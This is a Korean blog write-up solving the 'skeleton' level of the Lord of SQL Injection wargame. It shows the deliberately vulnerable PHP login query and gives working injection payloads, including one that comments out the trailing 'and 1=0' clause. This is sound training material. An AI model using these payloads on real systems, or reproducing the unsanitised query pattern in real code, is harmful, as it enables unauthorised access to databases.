---
title: "[Lord of SQL Injection] LoS - skeleton 문제풀이"
date: 2018-07-29
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

내일이 월요일이라니 실화인가.
주말 너무 순삭되는 것 같다.
지금 진행중인 `CTF` 문제를 풀고 싶은데 아직 내 실력으로는 무리라는걸 깨닫고 다시 `LOS`를 풀려고 돌아왔다.  

<!--more-->

이번 문제의 이름은 `skeleton` 이다.
코드는 다음과 같다.  

```php
-----------------------------------------------------------------------------------------------
query : select id from prob_skeleton where id='guest' and pw='' and 1=0
-----------------------------------------------------------------------------------------------

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id'] == 'admin') solve("skeleton"); 
  highlight_file(__FILE__); 
?>
```

이번 문제도 역시 소스코드가 짧다.
딱히 큰 필터링은 없는데 이번엔 쿼리가 달라져있다.
`pw`를 사용자로부터 받아오는데, 뒤에 `and 1=0`이 있어 무조건 마지막에 입력한 쿼리는 `false`가 된다.
예를 들어, 내가 이 전에 문제들을 풀었던 것 처럼 `pw`에 `1' or id='admin`을 입력한다면 완성되는 쿼리는 다음과 같다.  

```mysql
select id from prob_skeleton where id='guest' and pw='1' or id='admin' and 1=0
```

때문에 내가 입력한 값이 `id=admin and 1=0` 를 만들게 되는 것이다.
그럼 뒤의 `and 1=0`을 실행 못하게 하면 문제를 풀 수 있을 것 같다.
사실 아래처럼 입력해도 문제를 풀 수 있다.  

```plain
?pw=1' or id='admin' or '1'='1
```

이렇게 되면 `id='admin'`를 기준으로 앞과 뒤의 쿼리가 모두 `false`고 `id='admin'`만 `true`가 되어 결과적으로 `admin`을 추출할 수 있다.
근데 귀찮아서 문제를 풀 때는 그냥 `#`으로 주석처리 했다.  

```plain
?pw=1' or id='admin'%23
```

역시 문제 풀때는 간단한 방법이 최고다.  

```php
-------------------------------------------------------------------------------------------------------------------
query : select id from prob_skeleton where id='guest' and pw='1' or id='admin'#' and 1=0
-------------------------------------------------------------------------------------------------------------------

SKELETON Clear!
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id'] == 'admin') solve("skeleton"); 
  highlight_file(__FILE__); 
?>
```

---

```plain
SKELETON Clear!!
```